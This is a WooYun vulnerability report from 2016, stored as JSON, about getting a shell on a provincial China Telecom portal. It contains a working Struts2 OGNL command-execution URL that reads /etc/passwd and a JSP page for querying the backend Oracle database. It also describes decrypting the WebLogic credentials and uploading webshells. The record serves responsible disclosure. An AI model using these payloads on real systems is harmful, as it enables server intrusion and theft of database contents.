{"id": 88478, "wybug_id": "wooyun-2016-0212082", "wybug_title": "某省电信主站getshell                                      ", "wybug_corp": "中国电信", "wybug_author": "U神", "wybug_date": "2016-05-23 19:30", "wybug_open_date": "2016-07-08 10:40", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-06-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-08：\t细节向公众公开  简要描述： 一直放在手头比较久吧，没有太多时间去提交。 详细说明：  神器获取到一个命令执行：安徽电信：http://**.**.**.**/vportal/kd.action\nhttp://**.**.**.**/vportal/kd.action?redirect:$%7B%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B'cat','/etc/passwd'%7D)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%**.**.**.**.InputStreamReader%20(%23b),%23d%3dnew%**.**.**.**.BufferedReader(%23c),%23e%3dnew%20char%5B50000%5D,%23d.read(%23e),%23matt%3d%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println%20(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D\n\n\n根据分析，这是一个使用Weblogic搭建的站点，找到可以解析shell的地方直接上webshell，但是发现通过使用不少POC和工具测试，似乎很难写shell，于是就纳闷最后测试到鬼哥的st2工具才顺利获得shell。 但似乎是负载均衡的问题，可能导致某些时间或地域性问题导致访问shell是404\n\n   漏洞证明：  解密weblogic中的密码，获取了数据库密码（只是连上去看看，没有动啥数据）\n<url>jdbc:oracle:thin:@13*.6*.2*.1*:1521:ahwss</url>    <driver-name>oracle.jdbc.OracleDriver</driver-name>    <properties>      <property>        <name>user</name>        <value>vp****</value>      </property>    </properties>    <password-encrypted>{AES}qOKl2h***Rn8Tki***KYvMoRnw***/ArD**Cx4oOrYmWz4=</password-encrypted>\n\n\n很可惜禁止了服务端执行SQL语句，尝试绕过无果\n\n最后想出可以写一个脚本让服务端自身去执行SQL语句。\n<%@ page language=\"java\" import=\"java.util.*\" import=\"**.**.**.**.*\" import=\"java.sql.*\" pageEncoding=\"UTF-8\"%><!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"><html> <head>  <title>jdbc.jsp</title> </head> <body> <% try{ Connection con; Statement stmt; ResultSet rs;  Class.forName(\"oracle.jdbc.driver.OracleDriver\");  java.sql.DriverManager.registerDriver(new oracle.jdbc.driver.OracleDriver());  String dbUrl=\"jdbc:oracle:thin:@1**.*4.*.***3:1521:ah***\";//This your oracle address and current database String dbUser=\"vp**t***\"; String dbPwd=\"vp*t1***\";  con=java.sql.DriverManager.getConnection(dbUrl,dbUser,dbPwd);  stmt=con.createStatement();  rs=stmt.executeQuery(\"select * from user_tables\"); out.println(\"<table border=1 width=400>\"); while(rs.next()) { String col1=rs.getString(1); String col2=rs.getString(2); String col3=rs.getString(3);  out.println(\"<tr><td>\"+col1+\"</td><td>\"+col2+\"</td><td>\"+col3+\"</td></tr>\"); } out.println(\"</table>\");  rs.close(); stmt.close(); con.close(); }   catch(Exception e){out.println(e.getMessage());}   %> </body></html>\n\n\n   修复方案：  点到为止，我就是这样一个白帽子。测试中可能测试上传过一些jspshell 我能清理的尽量删除了.请排查安全银黄   版权声明：转载请注明来源 U神@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2016-05-24 10:30 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向中国电信集团公司通报,由其后续协调网站管理部门处置.  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-23 22:07 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:260 漏洞数:64        | http://sec.tuniu.com)\t\t \n  diao    \n     2016-05-23 22:53 |    \t\t陆由乙 \t\t\t( 普通白帽子  |\t\t\t        Rank:664 漏洞数:143        | 我是突突兔！)\t\t \n  终于发出来了啊。    \n     2016-05-24 11:48 |    \t\tCatsay \t\t\t( 实习白帽子  |\t\t\t        Rank:98 漏洞数:26        | 屌丝一枚)\t\t \n  膜拜.....    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}